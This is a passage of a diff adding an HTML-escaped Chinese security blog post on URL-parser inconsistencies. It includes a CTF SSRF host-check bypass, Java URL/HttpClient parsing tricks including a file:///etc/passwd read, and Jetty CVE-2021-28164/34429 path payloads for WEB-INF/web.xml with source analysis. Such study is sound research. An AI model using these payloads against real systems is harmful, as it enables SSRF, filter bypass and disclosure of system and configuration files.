+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_SSL_VERIFYHOST&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75715e">//https请求 不验证HOST
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$method&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_POST&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75715e">//请求方式为post请求
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;PUT&amp;#39;&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#75af00">strtoupper&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$method&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;DELETE&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$method&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">//设置请求方式
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75715e">//请求数据
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$timeout&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$header&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">//模拟的header头
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">//curl_setopt($ch, CURLOPT_HEADER, false);//设置不需要头信息
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75715e">//执行请求
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75715e">//关闭curl，释放资源
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$uu&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">parse_url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$uu&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;host&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#111">$uu&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;host&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$scheme&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$uu&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;scheme&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#111">$uu&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;scheme&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$host&lt;/span>&lt;span style="color:#111">)){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;host is null&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$scheme&lt;/span>&lt;span style="color:#111">)){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;scheme is null&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//https://ctf.pediy.com/upload/team/762/team236762.png?
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$host&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#34;ctf.pediy.com&amp;#34;&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#111">$host&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#34;127.0.0.1&amp;#34;&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#111">$host&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//echo curl_request(&amp;#34;http://123.57.254.42/flag.php&amp;#34;,&amp;#34;get&amp;#34;,[],true,5);//get flag
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">curl_request&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;get&amp;#34;&lt;/span>&lt;span style="color:#111">,[],&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;host not allow&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>/url.php源码见上，会curl我们的url参数&lt;/p>
+&lt;p>直接访问123.57.254.42/flag.php提示error ip，我们需要ssrf，但是有host检测，利用parse_url的漏洞混淆一下host&lt;/p>
+&lt;pre tabindex="0">&lt;code>/?url=123.57.254.42://ctf.pediy.com/../flag.php
+&lt;/code>&lt;/pre>&lt;p>原理分析参见&lt;a href="https://toutiao.io/posts/kuvr3yy/preview">这篇文章&lt;/a>，对于&lt;code>123.57.254.42://ctf.pediy.com&lt;/code>这样的特殊url，会被parse_url识别host为后者，但被curl实际访问时会判断前者为host&lt;/p>
+&lt;h2 id="java">Java&lt;/h2>
+&lt;p>Java有new URL和new URI，后者更普遍&lt;/p>
+&lt;h3 id="httpurlconnection">HttpURLConnection&lt;/h3>
+&lt;ul>
+&lt;li>&lt;a href="https://www.baidu.com">www.baidu.com&lt;/a>://www.qq.com:8080/sss&lt;/li>
+&lt;/ul>
+&lt;p>URL报错无法识别protocol，URI可以识别，详见&lt;a href="https://www.cnblogs.com/throwable/p/9740425.html">这篇文章&lt;/a>&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="http://www.baidu.com@www.xcao.vip:80@taobao.com">http://www.baidu.com@www.xcao.vip:80@taobao.com&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;p>host被解析为null且无法请求成功&lt;/p>
+&lt;ul>
+&lt;li>http://127.0.0.1@www.xcao.vip/file/flag.php&lt;/li>
+&lt;/ul>
+&lt;p>host被解析为后者，但getUserInfo的结果（浏览器解析）是前者，可能导致xss&lt;/p>
+&lt;ul>
+&lt;li>url:file:///etc/passwd?a=123&lt;/li>
+&lt;/ul>
+&lt;p>URL可以正常读取文件&lt;/p>
+&lt;h3 id="httpclient">HttpClient&lt;/h3>
+&lt;ul>
+&lt;li>&lt;a href="http://www.xcao.vip">http://www.xcao.vip&lt;/a>\www.baidu.com&lt;/li>
+&lt;li>&lt;a href="http://www.xcao.vip">http://www.xcao.vip&lt;/a>@www.baidu.com&lt;/li>
+&lt;/ul>
+&lt;p>均失败&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="http://www.baidu.com@www.xcao.vip@www.qq.com">http://www.baidu.com@www.xcao.vip@www.qq.com&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;p>httpclient4会识别为后者，和浏览器、URL 类以及 pase_url 都不同&lt;/p>
+&lt;p>httpclient3会报错，端口转化错误&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="http://127.0.0.1:80.xcao.vip/file/flag.php">http://127.0.0.1:80.xcao.vip/file/flag.php&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;p>httpclient4将会访问127.0.0.1:80/file/flag.php，原因是为了容错，80后面的非数&lt;/p>
+&lt;p>字会被丢弃，并且 host 会做一次urldecode，意思是http://127.0.0.1%3a80.xcao.vip/file/flag.php这种连接也是合法的&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="http://127.0.0.1%253a80%253f.xcao.vip/file/flag.php">http://127.0.0.1%253a80%253f.xcao.vip/file/flag.php&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;p>httclient3和4都会认为访问的是127.0.0.1:80/file/flag.php，原因是httpclient3会对截取的 host 部分url解码，然后再做一次urlpase，得到 host，这样就可以绕过诸如&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-reg" data-lang="reg">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">/^(http|https):\/\/([^\/\?&lt;/span>&lt;span style="color:#75715e">#]+\.)(baidu\.com)(\/|\?|#|$)/&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样的正则，某些场景下造成 SSRF 漏洞&lt;/p>
+&lt;p>或者如果用URL类来解析URL连接连接是否合法后再发送HttpClient请求，会存在被绕过的风险&lt;/p>
+&lt;h3 id="jettycve-2021-2816434429">Jetty/CVE-2021-28164/34429&lt;/h3>
+&lt;ul>
+&lt;li>CVE-2021-28164&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>/%2e/WEB-INF/web.xml # payload0
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>CVE-2021-34429&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>/%u002e/WEB-INF/web.xml # payload1
+/.%00/WEB-INF/web.xml # payload2
+/a/b/..%00/WEB-INF/web.xml # payload3
+&lt;/code>&lt;/pre>&lt;h4 id="分析">分析&lt;/h4>
+&lt;ul>
+&lt;li>payload1&lt;/li>
+&lt;/ul>
+&lt;p>发生在url解析中，定位到org.eclipse.jetty.http.HttpURI.java#parse，我们传入&lt;code>/HelloTomcat/%u002e/WEB-INF/web.xml&lt;/code>&lt;/p>
+&lt;p>当解析完成path之后，会先调用&lt;code>canonicalPath&lt;/code>函数，这是漏洞产生的第一个重点函数，主要是用于路径的规范化，也就是处理&lt;code>.&lt;/code>和&lt;code>..&lt;/code>；由于它会规范点段，而这里是被编码后的点，所以不变&lt;/p>
+&lt;p>继续进入decodePath中，开始进行解码，将路径变为&lt;code>/HelloTomcat/./WEB-INF/web.xml&lt;/code>&lt;/p>
+&lt;p>继续&lt;code>org.eclipse.jetty.server.handler.ContextHandler#isProtectedTarget&lt;/code>，会截取上面decodePath的结果的路径进行一个过滤，默认的保护列表有&lt;code>/web-inf&lt;/code>和&lt;code>/meta-inf&lt;/code>；但是显然我们访问的WEB-INF并不是小写的&lt;/p>
+&lt;p>之后具体获取资源时，还会调用和之前一样的canonicalPath函数将&lt;code>/./WEB-INF/web.xml&lt;/code>规范化为&lt;code>/WEB-INF/web.xml&lt;/code>，从而完成了整个漏洞的利用&lt;/p>
+&lt;ul>
+&lt;li>payload0的绕过&lt;/li>
+&lt;/ul>
+&lt;p>在处理过程中有一个&lt;code>_ambigous&lt;/code>参数，代表着此路径被认定是否存在歧义&lt;/p>
+&lt;p>针对payload0，在commit处，如果path不止有&lt;code>/&lt;/code>，就对其解码 继续规范化，变为&lt;code>/HelloTomcat/WEB-INF/web.xml&lt;/code>，再校验时会失败&lt;/p>
+&lt;p>而我们的payload1就堂而皇之的绕过了，说明&lt;code>%u002e&lt;/code>并没有被认定为歧义，回到org.eclipse.jetty.http.HttpURI.java#parse，&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#111">PATH&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">switch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#d88200">&amp;#39;#&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">checkSegment&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">segment&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pathMark&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mark&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">state&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpURI&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">State&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FRAGMENT&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">continue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#d88200">&amp;#39;%&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">encoded&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">escapedSlash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">continue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">dot&lt;/span> &lt;span style="color:#f92672">|=&lt;/span> &lt;span style="color:#111">segment&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">continue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">checkSegment&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">segment&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">segment&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">continue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">escapedSlash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">escapedSlash&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">1&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">2&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">continue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#d88200">&amp;#39;;&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">checkSegment&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">segment&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mark&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">state&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpURI&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">State&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">PARAM&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">continue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">case&lt;/span> &lt;span style="color:#d88200">&amp;#39;?&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">checkSegment&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">segment&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pathMark&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mark&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
